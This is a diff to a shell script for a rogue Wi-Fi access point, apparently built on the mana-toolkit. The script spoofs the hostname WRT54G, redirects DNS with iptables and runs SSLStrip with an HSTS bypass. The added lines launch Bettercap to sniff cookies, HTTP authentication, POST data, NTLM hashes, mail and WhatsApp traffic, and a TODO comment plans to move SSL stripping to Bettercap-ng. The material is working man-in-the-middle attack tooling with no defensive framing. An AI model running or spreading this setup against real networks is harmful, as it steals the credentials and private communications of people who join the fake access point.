@@ -9,6 +9,9 @@ hostname WRT54G
 echo hostname WRT54G
 sleep 2
 
+#Start Bettercap sniffer module, intercepting HTTPS traffic among others. TODO: Replace with Bettercap-ng once stable.
+gnome-terminal -e "bettercap -I $phy --sniffer --no-discovery -L -S NONE -P COOKIE,DHCP,DICT,FTP,HTTPAUTH,HTTPS,IRC,MAIL,MPD,MYSQL,NNTP,NTLMSS,PGSQL,POST,REDIS,RLOGIN,SNMP,SNPP,URL,WHATSAPP"
+
 service network-manager stop
 rfkill unblock wlan
 
@@ -35,6 +38,7 @@ iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
 iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 #iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
 
+#TODO: Replace SSLStrip and SSLSplit with Bettercap-ng; Requires using --http-proxy and --https-proxy.
 #SSLStrip with HSTS bypass
 cd /usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/
 python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log.`date "+%s"`&
